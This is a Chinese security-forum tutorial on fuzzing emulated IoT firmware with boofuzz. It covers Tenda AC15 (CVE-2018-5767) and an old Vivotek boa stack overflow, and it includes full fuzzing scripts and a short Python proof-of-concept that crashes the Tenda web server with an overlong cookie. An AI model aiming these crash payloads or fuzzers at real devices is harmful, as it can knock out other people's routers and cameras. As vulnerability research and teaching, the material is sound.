> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-282261.htm)

> [原创]boofuzz 在二进制 IOT 漏洞挖掘中的简单运用

前言
--

有个未曾谋面的看雪的坛友问我一门关于 IOT 挖洞的课怎么样，因为课表里写的太笼统，所以我也就没给明确答复，不过我说我愿意免费教教我会的东西，另外之前关于我 DIR-645 漏洞文章结尾也说了要讲讲怎么 fuzz 出那个漏洞，于是便有了这篇文章

正文
--

### 环境

Ubuntu 20.04

Python、pip、qemu 之类的直接用 apt-get 下载安装就好

IDA pro 之前提供过[下载链接](https://bbs.kanxue.com/thread-263758.htm#msg_header_h2_0)

binwalk 里有需要用到 sasquatch 程序，需要手动下载一下，命令如下

```
sudo git clone https://github.com/devttys0/sasquatch
cd sasquatch
sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev
./build.sh

```

### tenda AC15 CVE-2018-5767

#### 环境问题

 使用 binwalk 解包以后可以在 bin 文件夹下看到 httpd 程序，此时如果直接运行的话会卡在欢迎 banner 信息处

![](https://bbs.kanxue.com/upload/attach/202406/777502_2BBEK6T3A4TUHM5.jpg)

需要 patch 一些代码，修改判断逻辑

下图中红框内就是已经 patch 好的代码，点击 Edit > Patch program > Apply pathes to input file > OK 即可保存

![](https://bbs.kanxue.com/upload/attach/202406/777502_N7AJAJ4M35U9E7C.jpg)

修改完成后再次运行依然会报错

![](https://bbs.kanxue.com/upload/attach/202406/777502_B6YUMPCP64HW57K.jpg)

这个错误主要是 IP 地址不正确，需要查看一下 httpd 服务具体是怎么获取 IP 的，需要从 check_network 函数开始查，这个函数是引用了第三方的 lib 库（至少我在 Linux 源码里没找到这个函数）

```
find ./lib/ -name "*" | xargs grep 'check_network'

```

![](https://bbs.kanxue.com/upload/attach/202406/777502_BFUEYRQ5SGNRYHG.jpg)

结果会找到 libcommon.so 文件，用 IDA 打开后可以看到依然是调用了别的 so 库代码

![](https://bbs.kanxue.com/upload/attach/202406/777502_DM3BMQNDME34SZZ.jpg)

![](https://bbs.kanxue.com/upload/attach/202406/777502_APR6WM6UH8Q2UFU.jpg)

![](https://bbs.kanxue.com/upload/attach/202406/777502_PK9FBWHGMXTZ4EK.jpg)

需要继续搜 get_eth_name 函数位置

```
find ./lib/ -name "*" | xargs grep 'get_eth_name'

```

![](https://bbs.kanxue.com/upload/attach/202406/777502_GEK27CN7MJQXZVY.jpg)

有四个匹配，事实上是 libChipAPI.so 文件

![](https://bbs.kanxue.com/upload/attach/202406/777502_WP3UCW377VW3Z3Q.jpg)

从代码里可以看到程序在尝试读网卡信息，因为没有对应的网卡，所以程序 IP 地址会出错，所以这里需要手动创建一个 br0 网卡，并给一个 IP 地址（在创建之前建议先保存一个快照以防万一）

```
sudo tunctl -t br0 -u #用户名#        
sudo ifconfig br0 192.168.10.1/24

```

修改好后 httpd 程序就能正确运行了

![](https://bbs.kanxue.com/upload/attach/202406/777502_NEF729EU5BY8FF2.jpg)

#### fuzz 部分

此处需要抓包查看协议结构，但是因为只是普通的 HTTP 协议，我就直接给出 boofuzz 代码了

```
from boofuzz import *  
 
IP = "10.10.10.1"                #IP地址填自己的IP就好
PORT = 80
 
def check_response(target, fuzz_data_logger, session, *args, **kwargs):
    fuzz_data_logger.log_info("Checking test case response...")
    try:
        response = target.recv(512)
    except:
        fuzz_data_logger.log_fail("Unable to connect to target. Closing...")
        target.close()
        return
 
    #if empty response
    if not response:
        fuzz_data_logger.log_fail("Empty response, target may be hung. Closing...")
        target.close()
        return
 
    #remove everything after null terminator, and convert to string
    #response = response[:response.index(0)].decode('utf-8')
    fuzz_data_logger.log_info("response check...\n" + response.decode())
    target.close()
    return
     
def main():
    '''
    options = {
        "start_commands": [
            "sudo chroot /home/lys/Documents/IoT/firmware/_AC15_V15.03.1.16.bin.extracted/squashfs-root ./httpd"
        ],
        "stop_commands": ["echo stopping"],
        "proc_name": ["/usr/bin/qemu-arm-static ./httpd"]
    }
    procmon = ProcessMonitor("127.0.0.1", 26002)
    procmon.set_options(**options)
    '''
 
    session = Session(
        target=Target(
            connection=SocketConnection(IP, PORT, proto="tcp"),
            # monitors=[procmon]
        ),
        post_test_case_callbacks=[check_response],
    )
 
    s_initialize()
    with s_block("Request-Line"):
        # Line 1
        s_group("Method", ["GET"])
        s_delim(" ", fuzzable=False, )
        s_string("/goform/123", fuzzable=False)    # fuzzable 1
        s_delim(" ", fuzzable=False, )
        s_static("HTTP/1.1", )
        s_static("\r\n", )
        # Line 2
        s_static("Host")
        s_delim(": ", fuzzable=False, )
        s_string("10.10.10.1", fuzzable=False, )
        s_static("\r\n", )
        # Line 3
        s_static("Connection")
        s_delim(": ", fuzzable=False, )
        s_string("keep-alive", fuzzable=False, )
        s_static("\r\n", )
        # Line 4
        s_static("Cookie")
        s_delim(": ", fuzzable=False, )
        s_string("bLanguage", fuzzable=False, )
        s_delim("=", fuzzable=False)
        s_string("en", fuzzable=False, )
        s_delim("; ", fuzzable=False)
        s_string("password", fuzzable=False, )
        s_delim("=", fuzzable=False)
        s_string("ce24124987jfjekfjlasfdjmeiruw398r", fuzzable=True)    # fuzzable 2
        s_static("\r\n", )
        # over
        s_static("\r\n")
        s_static("\r\n")
 
    session.connect(s_get("Request"))
    session.fuzz()
 
if __name__ == "__main__":
    main()

```

在开始之前记得用 pip 安装一下 boofuzz，因为已经知道漏洞点了，所以很快就能跑出结果了

![](https://bbs.kanxue.com/upload/attach/202406/777502_FXP86SS8UV75GGB.jpg)

可以看到在 password 给出了一个非常长的值后程序崩溃了，验证其实也很简单，直接用 Python 脚本访问之前给 br0 的地址，端口是 80，cookie 中给一个超长的值就能复现崩溃了

```
import requests
 
ip = "10.10.10.1"                                #此处修改为自己的IP
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"password=" + "A"*1000}
ret = requests.get(url=url,cookies=cookie)
#print ret.text

```

最后在 bLanguage 这个字段也有个溢出，大家可以尝试修改上面的 fuzz 脚本复现一下

### Vivotek 漏洞栈溢出

这是一个 2017 年爆出的贼老的栈溢出漏洞，不过用来学习 boofuzz 的使用还是不错的

#### 环境问题

首先使用 binwalk 解包固件后会有不少文件，文件系统在这个目录下

```
_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root

```

http 服务用的是 boa

这里有两个点需要修复

首先将宿主机中 / etc/hosts 文件夹中的内容全部复制到固件文件系统的 / etc/hosts 文件中去

![](https://bbs.kanxue.com/upload/attach/202406/777502_UXP7QRRN9NETAE3.jpg)

然后将 _31.extracted/defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/ 目录直接拷贝到 squashfs-root/mnt/flash/ 目录中去，这一步主要是解决 boa 的 config 文件缺失问题

![](https://bbs.kanxue.com/upload/attach/202406/777502_W6ZUPR29XBPBWTT.jpg)

接下来直接用 qemu 命令运行 httpd 服务就行了

![](https://bbs.kanxue.com/upload/attach/202406/777502_664B4KFPM8SSMUT.jpg)

#### fuzz 部分

fuzz 这个洞的脚本如下

```
from boofuzz import *  
 
IP = "127.0.0.1"
PORT = 80
 
def check_response(target, fuzz_data_logger, session, *args, **kwargs):
    fuzz_data_logger.log_info("Checking test case response...")
    try:
        response = target.recv(512)
    except:
        fuzz_data_logger.log_fail("Unable to connect to target. Closing...")
        target.close()
        return
 
    #if empty response
    if not response:
        fuzz_data_logger.log_fail("Empty response, target may be hung. Closing...")
        target.close()
        return
 
    #remove everything after null terminator, and convert to string
    #response = response[:response.index(0)].decode('utf-8')
    fuzz_data_logger.log_info("response check...\n" + response.decode())
    target.close()
    return
     
def main():
    '''
    options = {
        "start_commands": [
            "sudo chroot /home/lys/Documents/IoT/firmware/_AC15_V15.03.1.16.bin.extracted/squashfs-root ./httpd"
        ],
        "stop_commands": ["echo stopping"],
        "proc_name": ["/usr/bin/qemu-arm-static ./httpd"]
    }
    procmon = ProcessMonitor("127.0.0.1", 26002)
    procmon.set_options(**options)
    '''
 
    session = Session(
        target=Target(
            connection=SocketConnection(IP, PORT, proto="tcp"),
            # monitors=[procmon]
        ),
        post_test_case_callbacks=[check_response],
    )
 
    s_initialize()
    with s_block("Request-Line"):
        # Line 1
        s_group("Method", ["POST"])
        s_delim(" ", fuzzable=False, )
        s_string("/cgi-bin/admin/upgrade.cgi", fuzzable=False)
        s_delim(" ", fuzzable=False, )
        s_static("HTTP/1.1",)
        s_static("\r\n", )
        # Line 2
        s_static("Content-Length")
        s_delim(": ", fuzzable=False, )
        s_string("data", fuzzable=True)
        s_static("\r\n")
 
    session.connect(s_get("Request"))
    session.fuzz()
 
if __name__ == "__main__":
    main()

```

![](https://bbs.kanxue.com/upload/attach/202406/777502_GPMJH8WBUGK88HD.jpg)

几乎是一瞬间，boa 服务就崩溃了，从输出信息来看，是因为 Content-Length 过长导致的，这也确实是这个洞的成因

结尾
--

boofuzz 是个挺不错的对协议的 fuzz 工具，比 AFL 好在不需要参与编译过程，也就是说不需要收集代码覆盖率信息；缺点也很明显，需要对协议格式深入分析，且因为没有代码覆盖率信息，所以对未知代码的触发基本靠运气

这里使用这两个 IOT 固件且只 fuzz 了 HTTP 服务是因为这两个固件的环境问题相对好解决且 HTTP 服务 fuzz 起来相对简单，所以解决环境问题最好的方式还是直接买硬件

参考链接
----

[https://xz.aliyun.com/t/5054?time__1311=n4%2BxnD07iti%3Dj2DBqooGkYLwq6DBDYTAD](https://xz.aliyun.com/t/5054?time__1311=n4%2BxnD07iti%3Dj2DBqooGkYLwq6DBDYTAD)

[https://www.anquanke.com/post/id/185336](https://www.anquanke.com/post/id/185336)

[https://blog.csdn.net/song_lee/article/details/113800058](https://blog.csdn.net/song_lee/article/details/113800058)

[[培训] 内核驱动高级班，冲击 BAT 一流互联网大厂工作，每周日 13:00-18:00 直播授课](https://www.kanxue.com/book-section_list-174.htm)

[#安全研究](forum-128-1-167.htm) [#技术分享](forum-128-1-168.htm) [#漏洞分析](forum-128-1-171.htm) [#漏洞挖掘](forum-128-1-178.htm) [#家用设备](forum-128-1-173.htm)